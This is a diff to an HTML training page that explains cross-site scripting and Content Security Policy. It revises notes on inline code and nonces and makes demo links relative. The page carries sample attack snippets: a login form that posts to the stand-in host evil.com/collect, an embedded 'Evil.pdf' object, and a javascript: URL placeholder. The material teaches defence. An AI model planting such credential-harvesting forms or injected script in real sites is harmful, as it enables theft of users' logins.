@@ -61,12 +61,12 @@ document.getElementsByTagName("*")[2].outerHTML
 <br /><br />
     Javascript in its simplest form can exist as inline code. 
     If an attacker manages to inject Javascript into a HTML page/DOM, 
-    they can execute any code they want. 
+    they can execute any code they want. Example: Hacker stores a script in a search form. 
+    When the server sends that script back to the browser, the browser executes that script.
     This is the most common form of XSS attack.
-    NOTE: CSP forbids ALL inline code 
-    in all forms in HTML pages/DOMs, regardless of what is allowed in the policy. 
+    NOTE: CSP forbids inline code no matter where it is loaded from UNLESS there is a nonce(whitelist). 
     So in the examples below you will find inline code in many elements (i.e. button onclick=)
-    Look for the word "inline" in error messages and then hunt them down.
+    Look for the word "inline" in CSP error messages and then hunt them down.
     <br /><br />
     <a href="/xss/xss-inline.html" target=”_blank”>XSS inline</a>
     <br /><br />
@@ -175,7 +175,7 @@ document.getElementsByTagName("*")[2].outerHTML
 
     <br /><br />
 
-    <a href="https://localhost:9381/xss/xss-form.html" target=”_blank”>Script with Forms</a>
+    <a href="/xss/xss-form.html" target=”_blank”>Script with Forms</a>
     <br /><br />
     <form method="POST" action="https://evil.com/collect">
       <label>Username</label>
@@ -187,7 +187,7 @@ document.getElementsByTagName("*")[2].outerHTML
       "
       />
 
-
+    </form>
 
 
 
@@ -201,15 +201,20 @@ document.getElementsByTagName("*")[2].outerHTML
       they can execute any code they want.
   
       <br /><br />
-      <a href="https://localhost:9381/xss/xss-pdf.html" target=”_blank”> Script in PDF</a>
+      <a href="/xss/xss-pdf.html" target=”_blank”> Script in PDF</a>
 
-      <br><br><textarea rows="10" cols="100">
+      <br><br>
+      
+      <textarea rows="10" cols="100">
       <object
         type="application/pdf"
         data="/media/examples/Evil.pdf"
         width="250"
         height="200"
       ></object>
+
+
+      
     </textarea
       >
 
@@ -219,12 +224,16 @@ document.getElementsByTagName("*")[2].outerHTML
       <br /><br />
       Javascript execution can occur in the URL. If an attacker manages to inject Javascript into the URL, they can execute any code they want.
             <br /><br />
-      <a href="https://localhost:9381/xss/xss-urljavascript.html" target=”_blank”> Script in URL</a>
+      <a href="/xss/xss-urljavascript.html" target=”_blank”> Script in URL</a>
       <br /><br />
       <br><br><textarea rows="10" cols="60">
         <a href="javascript: ...JS CODE...">js</a>
+
+
+
+
     </textarea
       >
-    </form>
+
   </body>
 </html>
